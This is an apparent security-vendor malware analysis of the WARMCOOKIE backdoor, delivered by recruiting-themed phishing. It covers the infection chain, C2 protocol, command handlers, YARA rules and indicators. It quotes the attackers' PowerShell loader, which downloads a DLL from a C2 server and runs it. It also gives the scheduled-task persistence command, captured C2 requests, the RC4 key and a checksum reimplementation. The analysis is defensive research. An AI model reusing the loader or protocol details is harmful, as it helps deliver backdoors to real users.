---
title: "Dipping into Danger: The WARMCOOKIE backdoor"
slug: "dipping-into-danger"
date: "2024-06-12"
subtitle: "Novel malware discovery by Elastic Security Labs masquerades as a recruiting offer"
description: "Elastic Security Labs observed threat actors masquerading as recruiting firms to deploy a new malware backdoor called WARMCOOKIE. This malware has standard backdoor capabilities, including capturing screenshots, executing additional malware, and reading/writing files."
author:
  - slug: daniel-stepanic
image: "warmcookie.jpg"
category:
  - slug: malware-analysis
tags:
  - warmcookie
  - backdoor
  - ref6127
---

## WARMCOOKIE at a glance

Elastic Security Labs observed a wave of email campaigns in late April targeting environments by deploying a new backdoor we’re calling WARMCOOKIE based on data sent through the HTTP cookie parameter. During initial triage, our team identified code overlap with a previously publicly reported [sample](https://esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign) by eSentire. The unnamed sample (`resident2.exe`) discussed in the post appears to be an older or deviated version of WARMCOOKIE. While some features are similar, such as the implementation of string obfuscation, WARMCOOKIE contains differing functionality. Our team is seeing this threat distributed daily with the use of recruiting and job themes targeting individuals.

WARMCOOKIE appears to be an initial backdoor tool used to scout out victim networks and deploy additional payloads. Each sample is compiled with a hard-coded C2 IP address and RC4 key.

This post will review an observed campaign and this new malware’s functionality. While the malware has a limited number of capabilities, it shouldn’t be taken lightly as it’s actively being used and impacting organizations at a global scale.

## Key takeaways

* REF6127 represents recruiting-themed phishing campaigns to deploy a new Windows backdoor: WARMCOOKIE
* WARMCOOKIE is a newly discovered backdoor used to fingerprint a machine, capture screenshots of the victim machine, and deploy additional payloads
* Threat actors are spinning up new domains and infrastructure weekly to support these campaigns
* This research includes an IDAPython script to decrypt strings from WARMCOOKIE
* Elastic Security provides prevention and visibility capabilities across the entire WARMCOOKIE infection chain

## REF6127 campaign overview

![WARMCOOKIE execution flow](/assets/images/dipping-into-danger/image10.png "WARMCOOKIE execution flow")

Since late April 2024, our team has observed new phishing campaigns leveraging lures tied to recruiting firms. These emails targeted individuals by their names and their current employer, enticing victims to pursue new job opportunities by clicking a link to an internal system to view a job description. Below is an example of the phishing email collected from previous open source reporting.

![Phishing email - Subject: “We’re Interested”](/assets/images/dipping-into-danger/image14.png "Phishing Email - Subject: “We’re Interested”")

Once clicked, the users hit a landing page that looks like a legitimate page specifically targeted for them. There, they are prompted to download a document by solving a CAPTCHA challenge. The landing pages resemble previous campaigns documented by Google Cloud’s security team when discussing a new variant of [URSNIF](https://cloud.google.com/blog/topics/threat-intelligence/rm3-ldr4-ursnif-banking-fraud/). Below is an example of the landing page collected from previous open source reporting.

![Landing page](/assets/images/dipping-into-danger/image6.png "Landing page")

Once the CAPTCHA is solved, an obfuscated JavaScript file is downloaded from the page. Our sample was named `Update_23_04_2024_5689382.js`; however, other samples used a different but similar naming structure. 

This obfuscated script runs PowerShell, kicking off the first task to load WARMCOOKIE.

![Initial execution chain as seen in Elastic Security for Endpoint](/assets/images/dipping-into-danger/image17.png "Initial execution chain as seen in Elastic Security for Endpoint")

The PowerShell script abuses the Background Intelligent Transfer Service (BITS) to download WARMCOOKIE and run the DLL with the `Start` export.

```powershell
start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\' + 
    [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 
    'http://80.66.88[.]146/data/5fb6dd81093a0d6812c17b12f139ce35' 
    -Destination $d; if (![System.IO.File]::Exists($d)) {exit}; $p = $d + 
    ',Start'; rundll32.exe $p; Start-Sleep -Seconds 10} -Argument 0 | wait-job | Receive-Job
```

### REF6127 infrastructure overview

By leveraging tools like [urlscan.io](https://urlscan.io/ip/45.9.74.135) and [VirusTotal](https://www.virustotal.com/gui/ip-address/45.9.74.135/relations), we observed the threat actor continually generating new landing pages rapidly on IP address `45.9.74[.]135`. The actor pushed to target different recruiting firms in combination with keywords related to the job search industry. 

![Domains associated with 45.9.74[.]135](/assets/images/dipping-into-danger/image3.png "Domains associated with 45.9.74[.]135")

Before hitting each landing page, the adversary distances itself by using compromised infrastructure to host the initial phishing URL, which redirects the different landing pages.

![Phishing link redirection](/assets/images/dipping-into-danger/image21.png "Phishing link redirection")

The threat actor generates new domains while the reputation catches up with each domain after each campaign run. At the time of writing, the threat actor can be seen pivoting to fresh domains without many reputation hits.

![Reputation for recently generated domains](/assets/images/dipping-into-danger/image18.png "Reputation for recently generated domains")

## WARMCOOKIE malware anlaysis

WARMCOOKIE is a Windows DLL used by the threat actor in two different stages. The first stage occurs right after the PowerShell download with the execution of WARMCOOKIE using the `Start` export. 

### Stage 1

Stage 1 copies the downloaded DLL from a temporary directory with a random name, such as: `wid4ta3v.3gm,` and places a copy of the DLL at `C:\ProgramData\RtlUpd\RtlUpd.dll`

After the copy, the malware sets up persistence using COM with the Windows Task Scheduler to configure the DLL to run with the following parameters. 

```cmd
"C:\WINDOWS\system32\rundll32.exe" "C:\ProgramData\RtlUpd\RtlUpd.dll",Start /p
```

With this design choice, WARMCOOKIE will run with System privileges from the Task Scheduler Engine. Below is a screenshot from [Hatching Triage](https://tria.ge/240528-2dhvdagb62/behavioral1) showing these two stages:

![WARMCOOKIE - Execution chain](/assets/images/dipping-into-danger/image13.png "WARMCOOKIE - Execution chain")

#### Persistence

A critical part of the infection chain comes from the scheduled task, which is set up at the very beginning of the infection. The task name (`RtlUpd`) is scheduled to run every 10 minutes every day.

![Persistence - Scheduled Task](/assets/images/dipping-into-danger/image34.png "Persistence - Scheduled Task")

### Stage 2

The second stage is where the DLL is combined with the command line (`Start /p`) and contains the core functionality of WARMCOOKIE. The malware starts by looking for the DLL inside the temporary directory from the PowerShell download.

![Initial code within WARMCOOKIE](/assets/images/dipping-into-danger/image23.png "Initial code within WARMCOOKIE")

#### Obfuscation 

WARMCOOKIE protects its strings using a custom string decryption algorithm. The first four bytes of each encrypted string in the `.rdata` section represent the size, the next four-bytes represent the RC4 key, and the remaining bytes represent the string.

![String Obfuscation - Legend](/assets/images/dipping-into-danger/image22.png "String Obfuscation - Legend")

Below is the CyberChef recipe using the bytes from the screenshot above:

![String Decryption via CyberChef](/assets/images/dipping-into-danger/image9.png "String Decryption via CyberChef")

One interesting observation is that the malware developer doesn’t always rotate the RC4 key between the encrypted strings.

![Same RC4 key for different encrypted string](/assets/images/dipping-into-danger/image1.png "Same RC4 key for different encrypted string")

#### Dynamic API loading

To prevent static analysis from identifying its core functionality, WARMCOOKIE uses dynamic API loading. There is no API hashing/resolving, and the targeted DLLs and sensitive strings are protected using encryption.

![Dynamic API loading within WARMCOOKIE](/assets/images/dipping-into-danger/image32.png "Dynamic API loading within WARMCOOKIE")

As demonstrated in the previous image, the developer shows some consideration for OpSec: any decrypted string is wiped from memory immediately after use, potentially avoiding memory signature scans.

#### Anti-debugging

The malware contains a few anti-analysis checks commonly used to target sandboxes. These are based on logic for checking the active number of CPU processors and physical/virtual memory values.

![Sandbox verification](/assets/images/dipping-into-danger/image40.png "Sandbox verification")

Below are the following conditions:

* If the number of processors is greater than or equal to 4 and the calculated value from the `GlobalMemoryStatusEx` call is greater than or equal to 0xF00, the malware will continue execution
* If the number of processors is greater than or equal to 8, the malware will continue execution
* If the calculated value from the `GlobalMemoryStatusEx` call is greater than `0x2000`, the malware will continue execution

#### Mutex

Each WARMCOOKIE sample comes hard coded with a GUID-like string as a mutex. Below are some examples we have observed:

* `f92e6f3c-9cc3-4be0-966c-1be421e69140`
* `91f785f4-2fa4-4c85-954d-b96768ca76f2`

![Setup before main functionality, including mutex creation](/assets/images/dipping-into-danger/image35.png "Setup before main functionality, including mutex creation")

Before the main functionality is executed, WARMCOOKIE uses an OR statement to verify the command-line arguments with `/p` returns `True` or to check whether the scheduled task persistence needs to be created.

#### Execution

Before the backdoor makes its first outbound network request, it captures the following values used to fingerprint and identify the victim machine. 

* Volume serial number
* DNS domain of the victim machine
* Computer name
* Username

This was a criteria used to identify the similarities to the malware in eSentire’s [report](https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign).

![Checksum calculations similar to eSentire's report](/assets/images/dipping-into-danger/image8.png "Checksum calculations similar to eSentire's report")

The WARMCOOKIE C2 server likely leverages a CRC32 checksum function to verify content sent from the victim machine. Inside WARMCOOKIE itself is a checksum function that takes an input string, a length, and an initial seed value for the CRC32 function. At the beginning of the function, the seed value is negated, so at different times, the checksum function is called with different seeds. We believe the developer added this step to make it a little harder for researchers to analyze and waste time.

![Beginning of CRC32 checksum function](/assets/images/dipping-into-danger/image31.png "Beginning of CRC32 checksum function")

The following three checksum calculations are encrypted with RC4 and sent through the HTTP cookie parameter:

* CRC32(c2_message_data)
* CRC32(mutex) ^ volume serial number
* CRC32(username) ^ CRC32(computer name)

Below is the implementation in Python with a usage example in the Appendix:

```python
def calculate_checksum(str_input, str_len, i):
    if i == 0:
        i = 0xFFFFFFFF
    if i == -1:
        i = 0

    for idx in range(0, str_len, 2):
        v6 = str_input[idx] | (str_input[idx + 1] << 8)
        for _ in range(16):
            if (v6 ^ i) & 1:
                i = ((i >> 1) ^ 0xEDB88320) & 0xFFFFFFFF
            else:
                i = (i >> 1) & 0xFFFFFFFF
            v6 >>= 1

    return ~i & 0xFFFFFFFF
```

#### Communication

WARMCOOKIE samples communicate over HTTP with a hardcoded IP address. The family uses a combination of RC4 and Base64 to protect its network traffic. The RC4 key is embedded in each sample. We have observed the same key being used in multiple samples. The key during this analysis is `24de21a8dc08434c`

![Hardcoded RC4 key being decrypted](/assets/images/dipping-into-danger/image11.png "Hardcoded RC4 key being decrypted")

The malware uses a custom structure to send the initial request to the C2 server, including the previously described checksum values and several fields used to track the offsets and size of the variable data.

These values are sent through the HTTP cookie parameter using the following custom structure:

```cpp
enum request_type
{ 
    REGISTRATION = 1, 
    COMMAND = 2 
};

struct os_info
{
    int major_version;
    int minor_version;
    int build_number;
    int version_calc;
};

struct initial_request
{
    int checksum_c2_message_data;
    int checksum_volume_mutex;
    int checksum_computer_name_username;
    request_type request_type;
    os_info os_ver;
    int offset_to_dns_domain;
    int size_base64_dns_domain;
    int offset_to_base64_computer_name;
    int size_base64_computer_name;
    int offset_to_base64_username;
    int size_base64_username;
    char base64_dns_domain[]; // Variable-length array
    char base64_username[]; // Variable-length array
    char base64_computer_name[]; // Variable-length array 
};
```

The first request to the C2 server is sent through a GET request using User Agent: `Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705`.

```curl
GET http://185.49.69[.]41/ HTTP/1.1
Cookie: x41OYTpmEwUUKm2AvnkS2onu1XqjP6shVvosIXkAD957a9RplEGFsUjR8f/lP1O8EERtf+idl0bimsKh8mRA7+dL0Yk09SwgTUKBu9WEK4RwjhkYuxd2JGXxhlA=
User-Agent: Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705)
Host: 185.49.69[.]41
Connection: Keep-Alive
Pragma: no-cache
```

Below is the CyberChef recipe of the HTTP cookie parameter decrypted from the first request, followed by a legend of the fields:  

![Decryption of HTTP cookie via CyberChef](/assets/images/dipping-into-danger/image24.png "Decryption of HTTP cookie via CyberChef")

![Decryption of HTTP cookie parameters via ImHex](/assets/images/dipping-into-danger/image20.png "Decryption of HTTP cookie parameters via ImHex")

WARMCOOKIE inserts a few integrity checks by generating hashes using the previously described checksum function. For example, the data in the decrypted HTTP cookie parameter from the 4th byte to the end is hashed and placed at the beginning (offset 0). Using the example above, this checksum value is `0xe51387e9`

Before the malware can receive instructions, integrity checks are also used to verify the incoming response from the C2 server. In this scenario, the C2 server produces the expected checksum for the data sent to the victim machine. This is located in the first four bytes of the request.
 
![Checksum verification from incoming server request](/assets/images/dipping-into-danger/image7.png "Checksum verification from incoming server request")

Below is a demonstration of this integrity check where the request data’s hash is `0x50d26cc3`.

![Integrity check via CyberChef](/assets/images/dipping-into-danger/image39.png "Integrity check via CyberChef")

If the checksum matches, WARMCOOKIE reads the command ID at the 8th-byte offset of the request to proceed to move to the next command handler.

### Bot functionality

WARMCOOKIE provides 7 command handlers for threat actors to retrieve additional victim information, record screenshots, launch additional payloads, etc. The provided functionality is relatively straightforward, allowing threat groups that need a lightweight backdoor to monitor victims and deploy further damaging payloads such as ransomware.

| Command ID | Description                                             |
|------------|---------------------------------------------------------|
| 1          | Retrieve victim details                                 |
| 2          | Record screenshots of victim machine                    |
| 3          | Retrieve installed programs via Uninstall registry path |
| 4          | Command-line execution (cmd.exe /c)                     |
| 5          | Write file to victim machine                            |
| 6          | Read file from victim machine                           |
| 10         | Delete scheduled task persistence                       |

#### Retrieve victim details - command ID (1)

This handler fingerprints and identifies the victim machines by collecting the IP address and CPU information. Interestingly, the imports required for this handler are statically imported. 

![Retrieving CPU info (Handler 1)](/assets/images/dipping-into-danger/image16.png "Retrieving CPU info (Handler 1)")

The malware uses HTTP `POST` requests when sending data back to the C2 server. The HTTP POST request data is encrypted via RC4 and sent over the network in raw form. In addition, the IP address and CPU information are Base64 encoded.

```curl
POST http://185.49.69[.]41/ HTTP/1.1
Cookie: x41OYTpmEwUUKm2AvnkS2onu1XqjP6shVvosIXkAD957a9RplEGFsUjR8f/lP1O8EERtf+idl0bimsKh8mRA7+dL0Yk09SwgTUKBu9WEK4RwjhkYuxd2JGXxhlA=
User-Agent: Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705)
Host: 185.49.69.41
Content-Length: 136
Connection: Keep-Alive
Pragma: no-cache

  qI:f*m  yڂ  z ? !  ,!w   k i A  K    k8 .(M ޣ> ދ  u[ôz  0 -U~    9 z G(  *X  o_  _      * Y, q  glTs   XI8b\)W   W"
```

After decrypting the HTTP POST request data, this presents a similar structure as before, where the data is front-loaded with the checksum values, offsets, and sizes to the pertinent information targeted by the handler. In this case, the Base64 encoded data is the IP Address and CPU info.

![Decrypted POST Request Data from Handler 1](/assets/images/dipping-into-danger/image36.png "Decrypted POST Request Data from Handler 1")

| Encoded Value                                                    | Decoded Value                                           |
|------------------------------------------------------------------|---------------------------------------------------------|
| MTkyLjE2OC4xODIuMTMx                                             | 192.168.182.131                                         |
| QU1EIFJ5emVuIDcgNzgwMFgzRCA4LUNvcmUgUHJvY2Vzc29yICAgICAgICAgICA= | AMD Ryzen 7 7800X3D 8-Core Processor                    |

#### Screenshot capture - command ID (2)

The ability to capture screenshots from victim machines provides a wide range of malicious options, such as stealing sensitive information displayed on the screen or actively monitoring the victim’s machine. This handler dynamically loads Windows DLLs used for graphics and drawing operations, such as `GDI32.DLL` and `GDIPLUS.DLL`, and then uses various APIs, such as `BitBlt`,`CreateCompatibleBitmap`, and `GetSystemMetrics` to generate the screenshot.

![Screen capture via BitBlt](/assets/images/dipping-into-danger/image26.png "Screen capture via BitBlt")

The collected screenshot is encrypted with RC4 and sent through a POST request along with the checksum data.

![Decrypted POST Request Data from Handler 3](/assets/images/dipping-into-danger/image38.png "Decrypted POST Request Data from Handler 3")

By looking for the file header `JPEG File Interchange Format (JFIF)`, we can carve out the image, and find a high-quality image of our sandbox machine (below) based on our request to this handler.

![Desktop capture from VM sandbox](/assets/images/dipping-into-danger/image29.jpg "Desktop capture from VM sandbox")

#### Retrieve installed programs - command ID (3)

This handler enumerates the installed programs on the victim machine via the registry key:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

![Grabbing the installed programs from the registry](/assets/images/dipping-into-danger/image12.png "Grabbing the installed programs from the registry")

The program's name, version, and installation date are Base64 encoded and placed into a pipe-delimited format along with the checksum data, offsets, and sizing.

![Decrypted POST Request Data from Handler 3](/assets/images/dipping-into-danger/image15.png "Decrypted POST Request Data from Handler 3")

Below is an example of one of the registry entries:

| Encoded Value            | Decoded Value     |
|--------------------------|-------------------|
| Ny1aaXAgMTguMDEgKHg2NCk= | 7-Zip 18.01 (x64) |

#### Command-line execution - command ID (4)

WARMCOOKIE uses this handler to provide backdoor access to the victim machine. The operator provides an argument that gets executed to `cmd.exe /c `without a console window.

![New process creation with custom command line](/assets/images/dipping-into-danger/image37.png "New process creation with custom command line")

In the example below, `whoami` is provided as the argument:

![Process tree with command-lines](/assets/images/dipping-into-danger/image33.png "Process tree with command-lines")

This function reads the output from the provided command and stores it in Base64, where it’s sent back to the C2 server. Below is an example of the decrypted data for this handler:

![Decrypted POST Request Data from Handler 4](/assets/images/dipping-into-danger/image30.png "Decrypted POST Request Data from Handler 4")

| Encoded Value                | Decoded Value       |
|------------------------------|---------------------|
| ZGVza3RvcC0yYzNpcWhvXHJlbQ0K | desktop-2c3iqho\rem |

#### Write file - command ID (5)

WARMCOOKIE can drop files on the victim machine; the threat actors provide the file path and file data.

![File Creation within Handler 5](/assets/images/dipping-into-danger/image28.png "File Creation within Handler 5")

As a test, we can write a file within a directory with some data and then read it in the next handler.

![Custom file creation](/assets/images/dipping-into-danger/image27.png "Custom file creation")

![Data written to custom file](/assets/images/dipping-into-danger/image19.png "Data written to custom file")

Depending on the file write result, WARMCOOKIE will send out a POST request with one of the following Base64 encoded values:

* `OK`
* `ERROR: Cannot write file`

![Decrypted POST Request Data from Handler 5](/assets/images/dipping-into-danger/image2.png "Decrypted POST Request Data from Handler 5")

#### Read file - command ID (6)

This handler can read file content from machines infected with WARMCOOKIE. The threat actor needs to provide the file path as the argument. 

![Reading files within Handler 6](/assets/images/dipping-into-danger/image25.png "Reading files within Handler 6")

Depending on the file read result, WARMCOOKIE will send out a POST request with one of the following Base64 encoded values along with the file contents:

* `OK (See 'Files' tab)`
* `ERROR: Cannot read file`

![Decrypted POST Request Data from Handler 6](/assets/images/dipping-into-danger/image5.png "Decrypted POST Request Data from Handler 6")

Based on the previous wording around a `Files` tab, the WARMCOOKIE operators may use a GUI element.

#### Remove persistence - command ID (10)

This handler removes the previously configured scheduled task with the name `RtlUpd`. By leveraging COM, it will call `DeleteFileW` within `mstask.dll` to remove the task.

![Callstack showing task deletion via COM](/assets/images/dipping-into-danger/image4.png "Callstack showing task deletion via COM")

## IDA string decryption tool

Elastic Security Labs is releasing an IDAPython script used to decrypt strings from WARMCOOKIE. The decrypted strings will be placed in the IDA Pro decompiler helping analysts identify key functionality. The string decryption and IDA commenting tool can be downloaded [here](https://github.com/elastic/labs-releases/tree/main/tools/warmcookie).

## Conclusion

WARMCOOKIE is a newly discovered backdoor that is gaining popularity and is being used in campaigns targeting users across the globe. Our team believes this malware represents a formidable threat that provides the capability to access target environments and push additional types of malware down to victims. While there is room for improvement on the malware development side, we believe these minor issues will be addressed over time. Elastic Security Labs will continue to monitor this threat and recommends that the industry do the same.

## WARMCOOKIE and MITRE ATT&CK

Elastic uses the [MITRE ATT&CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.

### Tactics

Tactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.

* [Initial Access](https://attack.mitre.org/tactics/TA0001)
* [Execution](https://attack.mitre.org/tactics/TA0002/)
* [Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
* [Discovery](https://attack.mitre.org/tactics/TA0007)
* [Command and Control](https://attack.mitre.org/tactics/TA0011)
* [Exfiltration](https://attack.mitre.org/tactics/TA0010/)

### Techniques

Techniques represent how an adversary achieves a tactical goal by performing an action.

* [Phishing](https://attack.mitre.org/techniques/T1566/)
* [User Execution: Malicious Link](https://attack.mitre.org/techniques/T1204/001/)
* [Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
* [System Information Discovery](https://attack.mitre.org/techniques/T1082/)
* [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)
* [Screen Capture](https://attack.mitre.org/techniques/T1113/)
* [Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)

## Preventing and detecting WARMCOOKIE

### Prevention

* [Suspicious PowerShell Downloads](https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/execution_suspicious_powershell_downloads.toml)
* [Scheduled Task Creation by an Unusual Process](https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/persistence_scheduled_task_creation_by_an_unusual_process.toml)
* [Suspicious PowerShell Execution via Windows Scripts](https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/execution_suspicious_powershell_execution.toml)
* [RunDLL32/Regsvr32 Loads a DLL Downloaded via BITS](https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/defense_evasion_rundll32_regsvr32_loads_a_dll_downloaded_via_bits.toml)
* [RunDLL32 with Unusual Arguments](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_rundll32_with_unusual_arguments.toml)
* [Windows.Trojan.WarmCookie](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_WarmCookie.yar)

### Detection w/YARA

Elastic Security has created YARA rules to identify this activity. Below are YARA rules to identify [WARMCOOKIE](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_WarmCookie.yar):

```yara
rule Windows_Trojan_WarmCookie_7d32fa90 {
    meta:
        author = "Elastic Security"
        creation_date = "2024-04-29"
        last_modified = "2024-05-08"
        os = "Windows"
        arch = "x86"
        threat_name = "Windows.Trojan.WarmCookie"
        license = "Elastic License v2"

     strings:
        $seq_checksum = { 45 8D 5D ?? 45 33 C0 41 83 E3 ?? 49 8D 4E ?? 44 03 DB 41 8D 53 ?? }
        $seq_string_decrypt = { 8B 69 04 48 8D 79 08 8B 31 89 6C 24 ?? 48 8D 4E ?? E8 }
        $seq_filesearch = { 48 81 EC 58 02 00 00 48 8B 05 82 0A 02 00 48 33 C4 48 89 84 24 40 02 00 00 45 33 C9 48 8D 44 24 30 45 33 C0 48 89 44 24 20 33 C9 41 8D 51 1A FF 15 83 4D 01 00 85 C0 78 22 48 8D 4C 24 30 E8 1D }
        $seq_registry = { 48 81 EC 80 02 00 00 48 8B 05 F7 09 02 00 48 33 C4 48 89 84 24 70 02 00 00 4C 89 B4 24 98 02 00 00 48 8D 0D 4D CA 01 00 45 33 F6 41 8B FE E8 02 4F 00 00 48 8B E8 41 B9 08 01 00 00 48 8D 44 24 }
        $plain_str1 = "release.dll" ascii fullword
        $plain_str2 = "\"Main Invoked.\"" ascii fullword
        $plain_str3 = "\"Main Returned.\"" ascii fullword
        $decrypt_str1 = "ERROR: Cannot write file" wide fullword
        $decrypt_str2 = "OK (No output data)" wide fullword
        $decrypt_str3 = "OK (See 'Files' tab)" wide fullword
        $decrypt_str4 = "cmd.exe /c %ls" wide fullword
        $decrypt_str5 = "Cookie:" wide fullword
        $decrypt_str6 = "%ls\\*.*" wide fullword
    condition:
        (3 of ($plain*)) or (2 of ($seq*)) or 4 of ($decrypt*)
}
```

## Observations

All observables are also available for [download](https://github.com/elastic/labs-releases/tree/main/indicators/warmcookie) in both ECS and STIX format.

The following observables were discussed in this research.

| Observable                                                       | Type      | Name       | Reference            |
|------------------------------------------------------------------|-----------|------------|----------------------|
| `ccde1ded028948f5cd3277d2d4af6b22fa33f53abde84ea2aa01f1872fad1d13` | SHA-256   | RtlUpd.dll | WARMCOOKIE           |
| `omeindia[.]com`                                                   | domain    |            | Phishing link        |
| `assets.work-for[.]top`                                            | domain    |            | Landing page         |
| `45.9.74[.]135`                                                    | ipv4-addr |            | Landing page         |
| `80.66.88[.]146`                                                   | ipv4-addr |            | WARMCOOKIE C2 server |
| `185.49.69[.]41`                                                   | ipv4-addr |            | WARMCOOKIE C2 server |

## References

The following were referenced throughout the above research:

* [https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign](https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign)
* [https://x.com/Cryptolaemus1/status/1785423804577034362](https://x.com/Cryptolaemus1/status/1785423804577034362)

## Appendix

**Checksum example**

```python
def calculate_checksum(str_input, str_len, i):
    if i == 0:
        i = 0xFFFFFFFF
    if i == -1:
        i = 0

    for idx in range(0, str_len, 2):
        v6 = str_input[idx] | (str_input[idx + 1] << 8)
        for _ in range(16):
            if (v6 ^ i) & 1:
                i = ((i >> 1) ^ 0xEDB88320) & 0xFFFFFFFF
            else:
                i = (i >> 1) & 0xFFFFFFFF
            v6 >>= 1

    return ~i & 0xFFFFFFFF


serial_volume = 0x0A2C9AD2F

mutex = "f92e6f3c-9cc3-4be0-966c-1be421e69140".encode("utf-16le")
mutex_result = calculate_checksum(mutex, len(mutex), -1)

username = "REM\x00".encode("utf-16le")
username_result = calculate_checksum(username, len(username), -1)

computer_name = "DESKTOP-2C3IQHO".encode("utf-16le")
computer_name_result = calculate_checksum(computer_name, len(computer_name), -1)

print(f"Mutex: {hex(mutex_result)}")
print(f"Username: {hex(username_result)}")
print(f"Computer Name: {hex(computer_name_result)}")
print(f"#1 Checksum: {hex(serial_volume ^ mutex_result)}")
print(f"#2 Checksum: {hex(username_result ^ computer_name_result)}")
```